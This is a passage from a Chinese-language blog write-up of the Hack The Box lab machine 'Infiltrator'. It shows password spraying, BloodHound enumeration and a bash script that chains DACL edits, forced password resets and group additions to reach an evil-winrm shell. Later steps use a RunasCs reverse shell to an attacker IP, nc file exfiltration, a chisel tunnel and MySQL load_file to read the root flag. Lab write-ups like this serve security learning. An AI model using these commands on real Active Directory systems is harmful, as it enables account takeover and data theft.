infiltrator.htb\o.martinez:WAT?watismypass! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\k.turner:WAT?watismypass! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\a.walker:WAT?watismypass! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\m.harris:WAT?watismypass! STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! </span><br></pre></td></tr></table></figure>

<p>虽然其他用户似乎在winrm和rdp上并不对’WAT?watismypass!’ 有用，但是似乎<code>d.anderson</code>用户在SMB服务中有些不一样；<code>STATUS_ACCOUNT_RESTRICTION</code> 是 Windows 操作系统中的一个错误代码，通常表示账户受到某种限制，导致登录或访问请求失败。</p>
<p>事实上，<code>WAT?watismypass!</code>密码其实对<code>d.anderson</code>用户是有效的，但是尝试一番，只能在kerberos协议中有效，而smb，winrm,rdp都没用</p>
<p>尝试通过<code>bloodhound-python</code>来收集域内用户或组之间的关系；查看是否有利用点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ bloodhound-python -u l.clark  -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> -d infiltrator.htb -ns 10.10.11.31 -c DcOnly   </span><br><span class="line">INFO: Found AD domain: infiltrator.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.infiltrator.htb</span><br><span class="line">INFO: Kerberos auth to LDAP failed, trying NTLM</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Connecting to LDAP server: dc01.infiltrator.htb</span><br><span class="line">INFO: Kerberos auth to LDAP failed, trying NTLM</span><br><span class="line">INFO: Found 14 <span class="built_in">users</span></span><br><span class="line">INFO: Found 58 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 2 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 09S</span><br></pre></td></tr></table></figure>

<p>查询<code>d.anderson</code>用户，点击”First Degree Object Control”,可以看到此用户对一个名为”MARKETING DIGITAL”的OU有着完全访问控制权限</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240904175957.png"></p>
<p>接着查询此OU,点击”Total User Objects”查询受此OU影响的用户或组，可以看到<code>e.rodriguez</code>在此OU中</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240904180450.png"></p>
<p>接着查询<code>e.rodriguez</code>用户，点击”First Degree Object Control”,可以看到用户对”chiefs marketing”组有 <code>Addself</code>权限；此边缘表示主体有能力将自己添加到目标安全组。由于安全组委派，安全组的成员拥有与该组相同的权限。</p>
<p>通过将自己添加到组并刷新令牌，您将获得该组拥有的所有相同权限。</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240904180723.png"></p>
<p>接着查询”chiefs marketing”组，发现其组有权限修改”m.harris“用户的密码</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240904184715.png"></p>
<p>再加上”m.harris“用户再 ”remote management users“组中，这意味着可以用过凭据通过winrm拿到shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240904184845.png"></p>
<p>脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># change ip to your dc ip</span></span><br><span class="line">dcip=<span class="string">&quot;10.10.11.31&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Getting d.anderson ticket&quot;</span></span><br><span class="line">impacket-getTGT infiltrator.htb/d.anderson:<span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Writing dacl&quot;</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=d.anderson.ccache</span><br><span class="line">dacledit.py -action <span class="string">&#x27;write&#x27;</span> -rights <span class="string">&#x27;FullControl&#x27;</span> -inheritance -principal <span class="string">&#x27;d.anderson&#x27;</span> -target-dn <span class="string">&#x27;OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB&#x27;</span> <span class="string">&#x27;infiltrator.htb/d.anderson&#x27;</span> -k -no-pass -dc-ip <span class="variable">$dcip</span></span><br><span class="line"><span class="comment"># using GenericAll Priv</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Changing e.rodriguez password&quot;</span></span><br><span class="line">bloodyAD --host <span class="string">&quot;dc01.infiltrator.htb&quot;</span> -d <span class="string">&quot;infiltrator.htb&quot;</span> --kerberos --dc-ip <span class="variable">$dcip</span> -u <span class="string">&quot;d.anderson&quot;</span> -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> <span class="built_in">set</span> password <span class="string">&quot;e.rodriguez&quot;</span> <span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br><span class="line"></span><br><span class="line">impacket-getTGT infiltrator.htb/e.rodriguez:<span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=e.rodriguez.ccache</span><br><span class="line"><span class="comment"># using AddSelf Priv</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Adding e.rodriguez to chiefs marketing group&quot;</span></span><br><span class="line">bloodyAD --host <span class="string">&quot;dc01.infiltrator.htb&quot;</span> -d <span class="string">&quot;infiltrator.htb&quot;</span> --dc-ip <span class="variable">$dcip</span> -u e.rodriguez -k add groupMember <span class="string">&quot;CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB&quot;</span> e.rodriguez</span><br><span class="line"><span class="comment"># Using ForceChangePassword Priv</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Changing password for m.harris&quot;</span></span><br><span class="line">bloodyAD --host <span class="string">&quot;dc01.infiltrator.htb&quot;</span> -d <span class="string">&quot;infiltrator.htb&quot;</span> --kerberos --dc-ip <span class="variable">$dcip</span> -u <span class="string">&quot;e.rodriguez&quot;</span> -p <span class="string">&#x27;WAT?watismypass!&#x27;</span> <span class="built_in">set</span> password <span class="string">&quot;m.harris&quot;</span> <span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Getting m.harris ticket&quot;</span></span><br><span class="line">impacket-getTGT infiltrator.htb/m.harris:<span class="string">&#x27;WAT?watismypass!&#x27;</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=m.harris.ccache</span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure that /etc/krb5.conf is filled with proper realm information otherwise winrm session will fail</span></span><br><span class="line"><span class="comment"># get the session using m.harris ticket and CanPsRemote priv</span></span><br><span class="line">evil-winrm -i dc01.infiltrator.htb -u <span class="string">&quot;m.harris&quot;</span> -r INFILTRATOR.HTB</span><br></pre></td></tr></table></figure>

<p>运行之前，记得用”ntpdate”命令将时间和靶机同步系统时间(因为在kerberos中；<strong>票证（Ticket）的有效期</strong>，通常为 8 小时，为什么会有这个8小时的限制，其实是为了防止hacker破解票据的可能；)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ sudo ntpdate -s infiltrator.htb</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">                                                                                                                    </span><br><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ bash poc.sh                    </span><br><span class="line">Getting d.anderson ticket</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> d.anderson.ccache</span><br><span class="line">Writing dacl</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU</span><br><span class="line">[*] DACL backed up to dacledit-20240904-064112.bak</span><br><span class="line">[*] DACL modified successfully!</span><br><span class="line">Changing e.rodriguez password</span><br><span class="line">[+] Password changed successfully!</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> e.rodriguez.ccache</span><br><span class="line">Adding e.rodriguez to chiefs marketing group</span><br><span class="line">[+] e.rodriguez added to CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB</span><br><span class="line">Changing password <span class="keyword">for</span> m.harris</span><br><span class="line">[+] Password changed successfully!</span><br><span class="line">Getting m.harris ticket</span><br><span class="line">Impacket v0.12.0.dev1+20240830.154152.9aa0954b - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> m.harris.ccache</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion                                                                                                                   </span></span><br><span class="line">                                        </span><br><span class="line">Warning: User is not needed <span class="keyword">for</span> Kerberos auth. Ticket will be used</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\M.harris\Documents&gt; <span class="built_in">whoami</span></span><br><span class="line">infiltrator\m.harris</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>对了，在此之前还要设置kali机的<code>/etc/krb5.conf</code>文件,为了让winrm走kerberos认证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">cat</span> /etc/krb5.conf</span><br><span class="line">[libdefaults]</span><br><span class="line">        default_realm = INFILTRATOR.htb</span><br><span class="line"></span><br><span class="line">[realms]</span><br><span class="line">        INFILTRATOR.HTB = &#123;</span><br><span class="line">                kdc = dc01.INFILTRATOR.htb</span><br><span class="line">                admin_server = dc01.INFILTRATOR.htb</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>因为<code>m.harris</code>在<code>Protected Users</code> 组中，此安全组有一些特点,只能使用 Kerberos 进行身份验证</p>
<p><code>Protected Users</code> 组的主要特点和功能：</p>
<ol>
<li><strong>限制身份验证协议</strong>：<ul>
<li>组成员不能使用 NTLM、Digest、CredSSP 等较弱的身份验证协议，只能使用 Kerberos 进行身份验证。</li>
</ul>
</li>
<li><strong>Kerberos 票证的短寿命</strong>：<ul>
<li>Kerberos 票证的有效期缩短到 4 小时，而不是通常的 8 小时，这使得攻击者很难利用被盗的票证。</li>
</ul>
</li>
<li><strong>无法使用缓存凭据登录</strong>：<ul>
<li>组成员无法使用缓存凭据进行离线登录，这减少了被盗凭据在其他系统上的滥用风险。</li>
</ul>
</li>
<li><strong>没有可委派的凭据</strong>：<ul>
<li>成员的 Kerberos 票证不会标记为可委派（Unconstrained Delegation），这防止了凭据被滥用来访问其他服务。</li>
</ul>
</li>
<li><strong>无用户复制凭据</strong>：<ul>
<li>组中的成员不能将凭据复制到其他系统，也无法通过远程桌面协议（RDP）进行身份验证，这些限制增加了凭据的安全性。</li>
</ul>
</li>
</ol>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>winpeas通过Display information about local users信息，能够在<code>K.turner</code>用户的”Comment”描述拿到其密码”MessengerApp@Pass!”</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Computer Name           :   DC01</span><br><span class="line">User Name               :   K.turner</span><br><span class="line">User Id                 :   1108</span><br><span class="line">Is Enabled              :   True</span><br><span class="line">User Type               :   User</span><br><span class="line">Comment                 :   MessengerApp@Pass!</span><br><span class="line">Last Logon              :   12/5/2023 4:05:15 PM</span><br><span class="line">Logons Count            :   0</span><br><span class="line">Password Last Set       :   2/25/2024 8:40:35 AM</span><br></pre></td></tr></table></figure>

<p>当我尝试去反弹一个”K.turner”用户的shell时，失败了，似乎这并不是登陆密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe  <span class="string">&quot;K.turner&quot;</span> <span class="string">&quot;MessengerApp@Pass!&quot;</span> -r 10.10.16.5:5656 cmd</span><br></pre></td></tr></table></figure>

<p>有一些以14开头的端口，开放一些有关outputmessenger服务和一个outputmessenager-mysqld服务</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240904193048.png"></p>
<p>我能在Google中找到有关”outputmessenger”的信息，是一款用于团队沟通的安全且私密的即时通讯工具</p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/20240904195941.png"></p>
<p>可以在”c:\ProgramData\Output Messenger Server\Temp”找到一堆zip文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c:\ProgramData\Output Messenger Server\Temp&gt;<span class="built_in">dir</span></span><br><span class="line">02/19/2024  08:51 AM    &lt;DIR&gt;          .</span><br><span class="line">02/19/2024  08:51 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/19/2024  08:51 AM        15,702,539 OutputMessengerApache.zip</span><br><span class="line">02/19/2024  08:51 AM        25,477,937 OutputMessengerMysql.zip</span><br><span class="line">02/19/2024  08:52 AM         3,369,187 OutputWall.zip</span><br><span class="line">02/19/2024  08:51 AM         6,554,576 vcredist_x86.exe</span><br><span class="line">               4 File(s)     51,104,239 bytes</span><br><span class="line">               2 Dir(s)  46,316,482,560 bytes free</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我可以通过nc将文件下载到kali</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc  -lp 443 &gt; OutputMessengerMysql.zip</span><br><span class="line">c:\temp\nc64.exe 10.10.16.5 443 &lt; OutputMessengerMysql.zip</span><br></pre></td></tr></table></figure>

<p>检查文件大小判断是否下载完成，25M没有问题</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">ls</span> -alih OutputMessengerMysql.zip</span><br><span class="line">1048884 -rw-r--r-- 1 kali kali 25M Sep  4 08:13 OutputMessengerMysql.zip</span><br></pre></td></tr></table></figure>

<p>将OutputMessengerMysql.zip文件解压缩之后，能在mysql&#x2F;my.ini 看到数据库密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ <span class="built_in">cat</span> mysql/my.ini   </span><br><span class="line"><span class="comment"># The following options will be passed to all MySQL clients</span></span><br><span class="line">[client]</span><br><span class="line">password=ibWijteig5</span><br><span class="line">port=14406</span><br><span class="line">socket=/tmp/mysql.sock</span><br><span class="line">[SNIP]</span><br></pre></td></tr></table></figure>

<p>由于靶机没有mysql工具，我可以将”14406”端口代理到kali机</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chisel server --reverse --port 1132</span><br><span class="line"></span><br><span class="line">.\chisel.exe client 10.10.16.5:1132 R:14406:127.0.0.1:14406</span><br></pre></td></tr></table></figure>

<p>mysql有权限读文件；非预期拿到root.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/htb/machines/windows/Infiltrator]</span><br><span class="line">└─$ mysql -h 127.0.0.1 -P 14406  --skip-ssl -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 4</span><br><span class="line">Server version: 10.1.19-MariaDB mariadb.org binary distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| outputwall         |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.100 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show grants</span><br><span class="line">    -&gt; ;</span><br><span class="line">+----------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Grants for root@localhost                                                                                                              |</span><br><span class="line">+----------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY PASSWORD &#x27;*5231D85B94E33260842B2EBB25BDF6B11B314C09&#x27; WITH GRANT OPTION |</span><br><span class="line">| GRANT PROXY ON &#x27;&#x27;@&#x27;%&#x27; TO &#x27;root&#x27;@&#x27;localhost&#x27; WITH GRANT OPTION                                                                          |</span><br><span class="line">+----------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.104 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; select load_file(&quot;c:\\users\\administrator\\desktop\\root.txt&quot;);</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| load_file(&quot;c:\\users\\administrator\\desktop\\root.txt&quot;) |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line">| 09cc96094d9ce3cff0e76aa69552b070</span><br><span class="line">                       |</span><br><span class="line">+----------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</p></div><div class="post-footer"><div class="tip">All rights reserved<br>Author: zIxyd</div><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-09-04</span><i class="fa fa-tag"></i><a class="tag" href="/tags/HTB/" title="HTB">HTB </a><span class="leancloud_visitors"></span><span>About 3859 words, 12 min 51 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/intent/tweet?text=I%20have%20found%20a%20great%20blog.%0A%0AzIxyd's%20Blog%20%C2%B7%20Infiltrator(HTB)%0Ahttps://zIxyd.github.io/2024/09/04/Infiltrator/%0A"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/04/26/Mysql%E5%B0%8F%E8%AE%B0/" title="Mysql小记">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/darkLightToggle.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>